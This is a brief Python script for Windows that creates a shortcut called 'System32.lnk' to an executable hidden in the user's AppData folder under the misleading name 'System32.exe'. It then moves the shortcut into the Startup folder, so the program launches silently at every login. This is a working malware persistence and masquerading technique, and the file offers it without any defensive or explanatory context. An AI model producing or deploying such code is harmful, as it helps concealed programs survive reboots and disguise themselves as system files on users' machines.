import os
import time
import shutil
import win32com.client

def create_shortcut(exe_path, shortcut_path):
    # Create a shortcut for the specified executable
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = exe_path
    shortcut.WorkingDirectory = os.path.dirname(exe_path)
    shortcut.IconLocation = exe_path
    shortcut.save()

def main():
    # Define paths
    appdata_path = os.getenv("APPDATA")
    exe_name = "System32.exe"
    exe_path = os.path.join(appdata_path, "System32", exe_name)

    # Create shortcut path in the user's Desktop
    shortcut_name = "System32.lnk"
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", shortcut_name)

    # Create the shortcut
    create_shortcut(exe_path, desktop_path)

    # Wait for 2 seconds
    time.sleep(2)

    # Move the shortcut to the Startup folder
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    shutil.move(desktop_path, os.path.join(startup_folder, shortcut_name))

if __name__ == "__main__":
    main()
